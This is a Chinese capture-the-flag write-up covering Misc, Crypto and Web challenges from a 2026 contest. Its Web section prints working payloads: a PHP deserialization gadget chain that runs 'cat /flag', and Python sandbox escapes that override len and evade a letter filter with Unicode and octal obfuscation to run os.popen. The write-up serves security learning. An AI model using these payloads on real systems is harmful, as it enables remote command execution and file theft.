# uettypi WP

## Misc

### Interference

打开附件后发现是图片XOR隐写，Stegsolve处理后得到了包含flag的原始二维码图片，OCR扫码后即可获得flag.

![image-20260308154259766](https://img.uettypi.top/2026/03/image-20260308154259766.png)

![image-20260308154325410](https://img.uettypi.top/2026/03/image-20260308154325410.png)

### Linux

打开终端后运行`env`命令即可在环境变量中找到flag.

![image-20260308113612273](https://img.uettypi.top/2026/03/image-20260308113612273.png)

### LinuxPro

打开终端后运行`cat /proc/1/environ`命令即可在第一个进程（初始化Docker）的环境变量中找到flag.

![image-20260308113956189](https://img.uettypi.top/2026/03/image-20260308113956189.png)

### README

打开附件后发现加密的`README.zip`中有一个和外面的`README.md`完全相同的`README.md`，可知是明文攻击，ARCHPR爆破后即可获得flag.

![image-20260308123735007](https://img.uettypi.top/2026/03/image-20260308123735007.png)

### Sign In

注意到图片中二维码的上方有一行小字，OCR提取后发现是一串16进制，CyberChef转换后即可获得flag.

![image-20260308160520275](https://img.uettypi.top/2026/03/image-20260308160520275.png)

![image-20260308134608811](https://img.uettypi.top/2026/03/image-20260308134608811.png)

### 小七的字符串

初读题干以为是栅栏密码，栏数为5(或7)，但多次尝试后均失败，此时注意到原编码中完整地包含了flag的格式`XAUTCTF{}`，故尝试直接从原编码中重组出flag，最终成功复原出flag为`XAUTCTF{w3lc0meT0x@uTC7f}`(不知道有没有记错，当时提交时leet中e和t的位置是逐个试出来的，现在写WP时想再去确认一下的时候发现无法提交了).

## Crypto

### BASE ALL

随波逐流一把梭了.

![image-20260308124213689](https://img.uettypi.top/2026/03/image-20260308124213689.png)

### Hello Elgamal

GPT一把梭了.

完整AI对话过程：https://chatgpt.com/share/69acff28-9cd0-800b-96ab-be6cd64bd4a7

利用脚本和运行过程：

![image-20260308124933033](https://img.uettypi.top/2026/03/image-20260308124933033.png)

### RSA Level 1

GPT一把梭了.

完整AI对话过程：https://chatgpt.com/share/69ad0042-ed60-800b-8172-65c6377b3d59

### RSA Level 2

GPT一把梭了.

完整AI对话过程：https://chatgpt.com/share/69ad009a-a440-800b-9899-e21f2e0a6c5c

利用脚本和运行过程：

![image-20260308125326412](https://img.uettypi.top/2026/03/image-20260308125326412.png)

### 望‘s RSA

Gemini一把梭了.

完整AI对话过程：https://g.co/gemini/share/904f576df5d1

利用脚本和运行过程：

![image-20260308130215907](https://img.uettypi.top/2026/03/image-20260308130215907.png)

### 粗心的阿米娅

Gemini一把梭了.

完整AI对话过程：https://g.co/gemini/share/9bb053837680

利用脚本和运行过程：

![image-20260308130659597](https://img.uettypi.top/2026/03/image-20260308130659597.png)

# Web

### BR的反序列化

利用链见脚本：

```php
<?php

class Logger {
    public $auditor;
    public $filename;
}

class Executor {
    public $command;

    public function __construct($cmd) {
        $this->command = $cmd;
    }
}

class Auditor {
    public $handler;
    public $secret_cmd;
}


$logger = new Logger();
$auditor1 = new Auditor();
$auditor2 = new Auditor();
$auditor3 = new Auditor();
$auditor4 = new Auditor();
$executor = new Executor("cat /flag");

$logger->auditor = $auditor1;
$auditor1->handler = $auditor2;
$auditor2->handler = $auditor3;
$auditor3->handler = $auditor4;
$auditor4->handler = $executor;

echo base64_encode(serialize($logger));

?>
```

![image-20260308140449819](https://img.uettypi.top/2026/03/image-20260308140449819.png)

![image-20260308140509036](https://img.uettypi.top/2026/03/image-20260308140509036.png)

### ez python

通过审阅`app.py`可知，这道题和其他的WAF绕过RCE题不一样，并不是黑名单机制，而是限制了Python审核钩子中所认定的event的长度，虽然有些方法不会触发审核钩子，但经过尝试发现这些方法均无法达到执行系统命令或读取系统文件的目的，故此处询问了AI(完整AI对话过程:[Gemini - 直接体验 Google AI 黑科技](https://gemini.google.com/share/9961715f1f95))，得到了一个关键的信息，即由于其将用户提交的代码直接拼接到了hook模块的末尾，故用户提交的代码和hook模块属于同一个变量作用域，清楚了这一点后，便可以构造出如下的payload：

```python
len=lambda x:0
import os
print(os.popen('cat /flag').read())
```

使用Burp发送POST请求后即可获得flag.

![image-20260308170147774](https://img.uettypi.top/2026/03/image-20260308170147774.png)

### ez python pro

通过审阅`app.py`可知，这道题在上一道题的基础上又增加了一些更严格的限制，其中最核心的是payload中禁止出现任何字母，此时想到Python中有一种特殊的Unicode字符解析机制(参考资料:[Python_Unicode字符机制解析 - Infernity's Blog](https://infernity.top/2025/09/16/Python-Unicode字符机制解析/))，再结合参数的8进制绕过(相较于Unicode码和16进制，编码中不包含字母，不会触发限制条件)和将3行缩减到2行(新的限制条件)，便可以构造出如下的payload(此处payload中的lambda不能使用Unicode字符，也不能使用8进制，但直接保留原样反而是可以的，个人猜测是代码提交后其在经过remove_keywords模块时被删除了，但被删除后其仍以某种形式被最终执行了，具体实现逻辑尚不明确)：

```python
ˡᵉⁿ=lambda ˣ:0
ᵖʳⁱⁿᵗ(__ⁱᵐᵖºʳᵗ__("\157\163").ᵖºᵖᵉⁿ("\143\141\164\040\057\146\154\141\147").ʳᵉªᵈ())
```

通过Python脚本发送POST请求后即可获得flag.

![image-20260308173104312](https://img.uettypi.top/2026/03/image-20260308173104312.png)

### happy shopping

通过审阅`app.py`可知，在购买时仅校验商品名称，故先注册一个商家账号并上架一件名为`FLAG`的商品，再注册一个买家账号直接购买即可获得flag.

![image-20260308142123561](https://img.uettypi.top/2026/03/image-20260308142123561.png)

![image-20260308142212201](https://img.uettypi.top/2026/03/image-20260308142212201.png)

